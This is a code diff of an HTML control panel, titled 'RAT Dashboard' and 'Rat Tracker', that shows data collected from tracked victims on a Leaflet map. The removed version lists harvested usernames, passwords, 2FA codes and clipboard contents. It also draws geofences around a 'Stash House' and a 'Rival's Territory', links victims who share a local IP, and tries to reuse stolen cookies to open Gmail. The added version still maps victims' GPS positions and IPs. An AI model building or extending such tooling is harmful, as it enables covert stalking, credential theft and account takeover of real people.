@@ -1,341 +1,84 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>👁️ Command Center</title>
-    <!-- Leaflet CSS -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <style>
-        body { margin: 0; background: #1a1a1a; color: #fff; font-family: monospace; display: flex; height: 100vh; }
-        #map-container { flex: 2; position: relative; }
-        #feed-container { flex: 1; padding: 20px; overflow-y: auto; border-left: 2px solid #333; }
-        .log-entry { margin-bottom: 10px; padding: 5px; border-bottom: 1px solid #444; font-size: 12px; }
-        .key-log { color: #0f0; }
-        .mouse-log { color: #0ff; }
-        .marker-popup { font-size: 12px; }
-    </style>
+ <meta charset="UTF-8">
+ <title>RAT Dashboard</title>
+ <!-- Leaflet CSS -->
+ <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+ <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+ <style>
+ body { margin: 0; background: #1a1a1a; color: #fff; font-family: monospace; display: flex; height: 100vh; }
+ #map-container { flex: 2; position: relative; }
+ #feed-container { flex: 1; padding: 20px; overflow-y: auto; border-left: 2px solid #333; background: #111; }
+ .log-entry { margin-bottom: 10px; padding: 5px; border-bottom: 1px solid #333; font-size: 12px; }
+ .key-log { color: #0f0; }
+ .mouse-log { color: #0ff; }
+ .marker-popup { font-size: 12px; }
+ .badge { display: inline-block; padding: 2px 7px; border-radius: 10px; font-size: 0.68rem; margin: 2px 3px 2px 0; }
+ .b-liar { background: #c0392b; }
+ .b-together { background: #8e44ad; }
+ .b-clipboard { background: #d35400; }
+ .b-bgapp { background: #2980b9; }
+ .b-zone { background: #27ae60; }
+ </style>
 </head>
 <body>
 
 <div id="map-container">
-    <div id="map" style="height: 100%;"></div>
+ <div id="map" style="height: 100%;"></div>
 </div>
 
 <div id="feed-container">
-    <h3>📡 Live Activity</h3>
-    <div id="logs"></div>
-</div>
-
-<!-- Leaflet JS -->
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-<script>
-    // Initialize Map
-    const map = L.map('map').setView([0, 0], 2);
-    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-        attribution: '&copy; OpenStreetMap contributors'
-    }).addTo(map);
-
-    let markers = {};
-
-    // Function to update UI
-    function addLog(type, content) {
-        const div = document.createElement('div');
-        div.className = `log-entry ${type}-log`;
-        div.textContent = `[${new Date().toLocaleTimeString()}] ${content}`;
-        document.getElementById('logs').prepend(div);
-        
-        // Keep DOM light
-        if (document.getElementById('logs').children.length > 50) {
-            document.getElementById('logs').lastChild.remove();
-        }
-    }
-
-    // Poll for updates every 2 seconds
-    setInterval(async () => {
-        // In a real app, you'd fetch from /api/logs and /api/spy-data separately
-        // Here we simulate fetching the latest batch
-        try {
-            const response = await fetch('/api/latest-spy-data'); // You'll need to implement this endpoint!
-            // For now, let's assume we have a global variable 'allData' updated by server
-            // In a real scenario, you'd use WebSockets for true real-time
-        } catch(e) {}
-    }, 2000);
-
-    // Example of adding a marker (triggered by backend)
-    function addMarker(userId, lat, lon, data) {
-        if (markers[userId]) map.removeLayer(markers[userId]);
-        
-        const popupContent = `<div class="marker-popup">
-            <b>User ID:</b> ${userId}<br>
-            <b>Last Action:</b> ${data.type}<br>
-            <b>URL:</b> ${data.currentUrl}
-        </div>`;
-        
-        markers[userId] = L.marker([lat, lon]).addTo(map)
-            .bindPopup(popupContent);
-            
-        addLog('mouse', `User ${userId} at (${lat.toFixed(4)}, ${lon.toFixed(4)}) - ${data.type}`);
-    }
-</script>
-</body>
-</html>
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Rat Tracker</title>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <style>
-        body { margin: 0; background: #1a1a1a; color: #fff; font-family: monospace; display: flex; height: 100vh; }
-        #map { height: 100vh; flex: 1; }
-        .info-panel { position: absolute; top: 10px; left: 10px; z-index: 1000; background: #000; padding: 10px; border: 1px solid #333; }
-        #sidebar { width: 380px; background: #111; border-left: 1px solid #333; overflow-y: auto; padding: 12px; }
-        #sidebar h3 { font-size: 0.95rem; margin: 0 0 8px; color: #00ffcc; }
-        .entry { background: #1c1c1c; border: 1px solid #333; border-radius: 6px; padding: 10px; margin-bottom: 10px; font-size: 0.78rem; }
-        .entry .id { color: #888; }
-        .badge { display: inline-block; padding: 2px 7px; border-radius: 10px; font-size: 0.68rem; margin: 2px 3px 2px 0; }
-        .b-liar { background: #c0392b; }
-        .b-together { background: #8e44ad; }
-        .b-clipboard { background: #d35400; }
-        .b-bgapp { background: #2980b9; }
-        .b-zone { background: #27ae60; }
-        .field { color: #aaa; }
-        .cred { color: #f1c40f; }
-        .zone-circle-label { color: #0f0; font-size: 11px; text-shadow: 0 0 3px #000; }
-    </style>
-</head>
-<body>
-    <div class="info-panel">
-        <h3>🕵️ Active Rats</h3>
-        <div id="stats">Loading...</div>
-    </div>
-    <div id="map"></div>
-
-    <div id="sidebar">
-        <h3>📡 Recent Rats</h3>
-        <div id="entries"></div>
-        <h3 style="margin-top:18px;">🔓 Harvested Creds</h3>
-        <div id="creds"></div>
-    </div>
-
-    <script>
-        const ZONES = [
-            { name: 'House',           lat: 40.7128, lon: -74.0060, radius: 300   },
-            { name: 'Stash House',     lat: 40.7306, lon: -73.9352, radius: 500   },
-            { name: "Rival's Territory", lat: 40.6782, lon: -73.9442, radius: 1000 }
-        ];
-
-        const map = L.map('map').setView([40.72, -73.97], 12);
-        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-            attribution: '&copy; OpenStreetMap contributors'
-        }).addTo(map);
-
-        // Draw the geofence zones
-        ZONES.forEach(z => {
-            L.circle([z.lat, z.lon], { radius: z.radius, color: '#27ae60', fillOpacity: 0.08, weight: 2 })
-                .addTo(map)
-                .bindTooltip(z.name, { className: 'zone-circle-label', permanent: true, direction: 'center' });
-        });
-
-        const distM = (a, b) => {
-            const R = 6371000, toRad = d => d * Math.PI / 180;
-            const dLat = toRad(b.lat - a.lat), dLon = toRad(b.lon - a.lon);
-            const x = Math.sin(dLat/2)**2 + Math.cos(toRad(a.lat))*Math.cos(toRad(b.lat))*Math.sin(dLon/2)**2;
-            return 2 * R * Math.asin(Math.sqrt(x));
-        };
-
-        // The four anomaly checks
-        const anomalies = (log) => {
-            const out = [];
-            if (log.zones && log.zones.length) out.push({ cls: 'b-zone', label: '📍 ' + log.zones.join(', ') });
-            // Liar: charging true but low discharge time
-            if (log.is_charging === true && log.discharging_time != null && log.discharging_time < 3600) out.push({ cls: 'b-liar', label: 'Liar Alert' });
-            // Background App: mic active but tab hidden
-            if (log.audio_active === true && log.visibility_state === 'hidden') out.push({ cls: 'b-bgapp', label: 'Background App' });
-            // Clipboard leak
-            if (log.clipboard_content) out.push({ cls: 'b-clipboard', label: 'Clipboard Leak' });
-            return out;
-        };
-
-        function render(logs) {
-            // "Together?" — same local_ip within 10 minutes -> draw a line
-            const withIP = logs.filter(l => l.local_ip && l.lat && l.lon);
-            const drawn = [];
-            for (let i = 0; i < withIP.length; i++) {
-                for (let j = i + 1; j < withIP.length; j++) {
-                    const a = withIP[i], b = withIP[j];
-                    if (a.local_ip === b.local_ip) {
-                        const mins = Math.abs(new Date(a.timestamp) - new Date(b.timestamp)) / 60000;
-                        if (mins <= 10) {
-                            L.polyline([[a.lat, a.lon], [b.lat, b.lon]], { color: '#8e44ad', weight: 3, dashArray: '6 6' }).addTo(map);
-                            drawn.push(true);
-                        }
-                    }
-                }
-            }
-
-            document.getElementById('stats').innerText =
-                `Total Tracked: ${logs.length}  ·  Together pairs: ${drawn.length}`;
-
-            const entries = document.getElementById('entries');
-            entries.innerHTML = '';
-            // newest first
-            [...logs].reverse().forEach(log => {
-                const div = document.createElement('div');
-                div.className = 'entry';
-                const bads = anomalies(log).map(b => `<span class="badge ${b.cls}">${b.label}</span>`).join('');
-                div.innerHTML = `
-                    <div class="id">#${log.id.slice(0, 8)}</div>
-                    <div>${bads || '<span class="field">no anomalies</span>'}</div>
-                    <div class="field">GPS ${log.lat != null ? log.lat.toFixed(4) + ', ' + log.lon.toFixed(4) : 'n/a'}</div>
-                    <div class="field">IP ${log.local_ip || 'n/a'} · ${log.connection_type || '?'} · ${log.timezone || ''}</div>
-                    <div class="field">🔋 ${log.battery_level != null ? Math.round(log.battery_level * 100) + '%' : 'n/a'} ${log.is_charging ? '(charging)' : '(not)'}</div>
-                    ${log.clipboard_content ? `<div class="cred">📋 ${log.clipboard_content.slice(0, 40)}</div>` : ''}
-                    <div class="field">${new Date(log.timestamp).toLocaleTimeString()}</div>`;
-                entries.appendChild(div);
-
-                // Map marker
-                if (log.lat != null && log.lon != null) {
-                    const inZone = (log.zones || []).length > 0;
-                    L.marker([log.lat, log.lon], {
-                        icon: L.divIcon({ html: `<div style="width:14px;height:14px;border-radius:50%;background:${inZone ? '#27ae60' : '#e74c3c'};border:2px solid #fff;box-shadow:0 0 6px ${inZone ? '#27ae60' : '#e74c3c'};"></div>`, className: '' })
-                    })
-                    .bindPopup(
-                        `<b>ID:</b> ${log.id}<br><b>IP:</b> ${log.local_ip || 'N/A'}<br>` +
-                        `<b>Time:</b> ${new Date(log.timestamp).toLocaleString()}<br>` +
-                        `<b>Battery:</b> ${log.battery_level != null ? Math.round(log.battery_level*100)+'%' : 'n/a'} ${log.is_charging ? '⚡' : ''}<br>` +
-                        `<b>Conn:</b> ${log.connection_type || 'n/a'} · <b>TZ:</b> ${log.timezone || 'n/a'}<br>` +
-                        (log.clipboard_content ? `<b>📋 Clipboard:</b> ${log.clipboard_content}<br>` : '') +
-                        anomalies(log).map(b => `<b>${b.label}</b>`).join('<br>')
-                    )
-                    .addTo(map);
-                }
-            });
-        }
-
-        function renderCreds(creds) {
-            const box = document.getElementById('creds');
-            box.innerHTML = creds.length ? '' : '<div class="field">none yet</div>';
-            [...creds].reverse().forEach(c => {
-                const div = document.createElement('div');
-                div.className = 'entry';
-                div.innerHTML = `<div class="cred">👤 ${c.username}</div>
-                    <div class="field">IP ${c.ip} · ${c.step === '2fa' ? 'OTP: ' + c.otp : 'password'}</div>
-                    <div class="field">${new Date(c.timestamp).toLocaleString()}</div>`;
-                box.appendChild(div);
-            });
-        }
-
-        // Load data + refresh every 15s
-        const load = () => {
-            fetch('/api/logs').then(r => r.json()).then(render);
-            fetch('/api/harvest').then(r => r.json()).then(renderCreds);
-        };
-        load();
-        setInterval(load, 15000);
-    </script>
-</body>
-</html>
-
-<!-- In your index.html, create a container for the hijacked session -->
-<div id="session-viewer">
-    <h3>Live Session</h3>
-    <iframe id="target-frame" width="100%" height="600px" src=""></iframe>
+ <h3>📡 Live Activity</h3>
+ <div id="logs"></div>
 </div>
 
 <script>
-// When you receive a cookie update, try to load their account
-function loadSession(userId, cookieString) {
-    const frame = document.getElementById('target-frame');
-    // We can't easily pass custom headers to an iframe, 
-    // but you can try appending the cookie as a query param or using a proxy.
-    // For now, let's just log the cookie for debugging:
-    console.log(`Cookie for ${userId}: ${cookieString}`);
-    
-    // Attempt to load Gmail (may be blocked by X-Frame-Options)
-    frame.src = 'https://mail.google.com'; 
-}
-</script>
+ // Initialize Map
+ const map = L.map('map').setView([0, 0], 2);
+ L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+ attribution: '&copy; OpenStreetMap contributors'
+ }).addTo(map);
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>RAT Dashboard</title>
-    <!-- Leaflet CSS -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <style>
-        body { margin: 0; font-family: 'Courier New', monospace; background: #1a1a1a; color: #fff; }
-        .container { display: flex; height: 100vh; }
-        #map { flex: 2; height: 100%; border-right: 2px solid #333; }
-        .sidebar { flex: 1; padding: 20px; overflow-y: auto; background: #252525; }
-        h2 { color: #00ff00; margin-top: 0; }
-        .log-entry { background: #333; padding: 10px; margin-bottom: 10px; border-left: 3px solid #00ff00; font-size: 0.9em; }
-        .cookie-box { background: #000; padding: 5px; word-break: break-all; font-size: 0.8em; color: #aaa; margin-top: 5px; }
-        .status-ok { color: #00ff00; }
-        .status-fail { color: #ff0000; }
-    </style>
-</head>
-<body>
+ let markers = {};
 
-<div class="container">
-    <div id="map"></div>
-    <div class="sidebar">
-        <h2>📡 Live Logs</h2>
-        <div id="logs-container"></div>
-    </div>
-</div>
+ // Function to update UI
+ function addLog(type, content) {
+ const div = document.createElement('div');
+ div.className = `log-entry ${type}-log`;
+ div.textContent = `[${new Date().toLocaleTimeString()}] ${content}`;
+ document.getElementById('logs').prepend(div);
+ 
+ // Keep DOM light
+ if (document.getElementById('logs').children.length > 50) {
+ document.getElementById('logs').lastChild.remove();
+ }
+ }
 
-<!-- Leaflet JS -->
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-<script>
-    // Initialize Map
-    const map = L.map('map').setView([0, 0], 2);
-    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-        attribution: '&copy; OpenStreetMap contributors'
-    }).addTo(map);
+ // Poll for updates every 2 seconds
+ setInterval(async () => {
+ try {
+ const response = await fetch('/api/logs');
+ const data = await response.json();
+ 
+ // Clear existing markers to redraw fresh ones
+ Object.values(markers).forEach(m => map.removeLayer(m));
+ markers = {};
 
-    const markers = {};
-
-    function addLog(data) {
-        const container = document.getElementById('logs-container');
-        const div = document.createElement('div');
-        div.className = 'log-entry';
-        
-        let content = `<strong>${new Date(data.timestamp).toLocaleTimeString()}</strong><br>`;
-        content += `IP: ${data.ip || 'Unknown'}<br>`;
-        content += `SSID: ${data.wifiSSID || 'N/A'}<br>`;
-        
-        if (data.type === 'cookie_injection') {
-            content += `<span class="status-ok">🍪 Session Captured!</span>`;
-            div.innerHTML = content + `<div class="cookie-box">${data.cookies}</div>`;
-        } else {
-            content += `Lat: ${data.lat}, Lon: ${data.lon}`;
-            div.innerHTML = content;
-        }
-
-        container.prepend(div);
-
-        // Add Marker to Map if it has coordinates
-        if (data.lat && data.lon && !markers[data.userId]) {
-            const marker = L.marker([data.lat, data.lon]).addTo(map)
-                .bindPopup(`<b>User ${data.userId}</b><br>${content}`);
-            markers[data.userId] = marker;
-            map.setView([data.lat, data.lon], 13);
-        }
-    }
-
-    // Fetch logs every 2 seconds
-    setInterval(() => {
-        fetch('/api/logs')
-            .then(res => res.json())
-            .then(data => {
-                // Only update if there are new logs
-                const lastLog = data[data.length - 1];
-                if (lastLog) addLog(lastLog);
-            });
-    }, 2000);
+ data.forEach(log => {
+ if (log.lat && log.lon) {
+ const marker = L.marker([log.lat, log.lon]).addTo(map)
+ .bindPopup(`<b>ID:</b> ${log.id}<br><b>IP:</b> ${log.local_ip || 'N/A'}<br><b>Time:</b> ${new Date(log.timestamp).toLocaleString()}`);
+ markers[log.id] = marker;
+ addLog('mouse', `User ${log.id} at (${log.lat.toFixed(4)}, ${log.lon.toFixed(4)})`);
+ } else {
+ addLog('key', `No GPS Data from ${log.id}`);
+ }
+ });
+ } catch(e) {
+ console.error("Fetch failed", e);
+ }
+ }, 2000);
 </script>
 </body>
 </html>
